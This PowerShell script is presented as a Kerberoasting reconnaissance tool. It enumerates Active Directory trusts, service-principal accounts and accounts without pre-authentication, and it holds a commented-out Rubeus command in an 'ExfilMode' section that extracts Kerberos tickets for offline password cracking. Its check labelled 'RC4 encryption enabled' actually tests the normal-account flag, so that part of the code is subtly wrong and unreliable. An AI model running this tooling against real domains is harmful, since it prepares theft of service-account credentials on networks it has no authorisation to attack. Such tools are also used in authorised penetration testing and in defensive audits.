# Kebercon.ps1
# Author: theMavguardian
# Description: Kerberoasting Recon Tool with trusted domain traversal, roastable account detection, stale account checks, password hygiene analysis, and optional Rubeus integration.
# Version: 1.0

<###############################################>
# Module 1: Environment Setup and Parameters
<###############################################>

param(
    [switch]$NonDomainMode,
    [switch]$ExfilMode
)

$ScriptName = "Kebercon"
$OutputDir = "$PSScriptRoot\Kebercon-Results"
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir | Out-Null }

Write-Host "[$ScriptName] Starting reconnaissance..." -ForegroundColor Magenta

<###############################################>
# Module 2: Trusted Domain Enumeration
<###############################################>

function Get-TrustedDomains {
    try {
        $trusted = (Get-ADTrust -ErrorAction Stop).Name
        Write-Host "[+] Trusted Domains:" -ForegroundColor Cyan
        $trusted | ForEach-Object { Write-Host "    $_" -ForegroundColor Gray }
        return $trusted
    } catch {
        Write-Warning "[!] Could not enumerate trusted domains. Falling back to current domain only."
        return @((Get-ADDomain).DNSRoot)
    }
}

$Domains = if ($NonDomainMode) {@()} else { Get-TrustedDomains }

<###############################################>
# Module 3: Roastable Account Detection (SPN + RC4)
<###############################################>

function Find-KerberoastableAccounts {
    param($Domain)

    try {
        Write-Host "[+] Scanning for roastable SPN accounts in domain: $Domain" -ForegroundColor Cyan
        $users = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Server $Domain -Properties ServicePrincipalName,PasswordLastSet,LastLogonDate,PasswordNeverExpires,UserAccountControl

        $users | ForEach-Object {
            $spn = $_.ServicePrincipalName
            if ($spn -and ($_.UserAccountControl -band 0x200)) {  # RC4 encryption enabled
                $stale = ($_.LastLogonDate -lt (Get-Date).AddDays(-180))
                $neverExpires = $_.PasswordNeverExpires
                $line = "[+] $($_.SamAccountName) | Stale: $stale | NeverExpires: $neverExpires | SPNs: $($spn -join ", ")"
                Write-Host $line -ForegroundColor Yellow
                $line | Out-File "$OutputDir\roastable_$Domain.txt" -Append
            }
        }
    } catch {
        Write-Warning "[!] Failed to query domain: $Domain"
    }
}

$Domains | ForEach-Object { Find-KerberoastableAccounts -Domain $_ }

<###############################################>
# Module 4: AS-REP Roast Detection
<###############################################>

function Find-ASREP-RoastableAccounts {
    param($Domain)
    try {
        Write-Host "[+] Scanning for AS-REP roastable accounts in domain: $Domain" -ForegroundColor Cyan
        $users = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Server $Domain -Properties SamAccountName
        foreach ($u in $users) {
            Write-Host "[AS-REP] $($u.SamAccountName)" -ForegroundColor Green
            $u.SamAccountName | Out-File "$OutputDir\asrep_$Domain.txt" -Append
        }
    } catch {
        Write-Warning "[!] Failed to enumerate AS-REP accounts in $Domain"
    }
}

$Domains | ForEach-Object { Find-ASREP-RoastableAccounts -Domain $_ }

<###############################################>
# Module 5: Optional Rubeus Integration (Exfil Mode)
<###############################################>

if ($ExfilMode) {
    Write-Host "[!] Exfil mode is enabled. Rubeus execution placeholder active." -ForegroundColor Red
    # Uncomment below to execute Rubeus with ticket extraction
    # & "Rubeus.exe" kerberoast /outfile:"$OutputDir\rubeus_tickets.txt"
}

<###############################################>
# Module 6: Summary
<###############################################>

Write-Host "[$ScriptName] Recon complete. Output saved to: $OutputDir" -ForegroundColor Magenta 
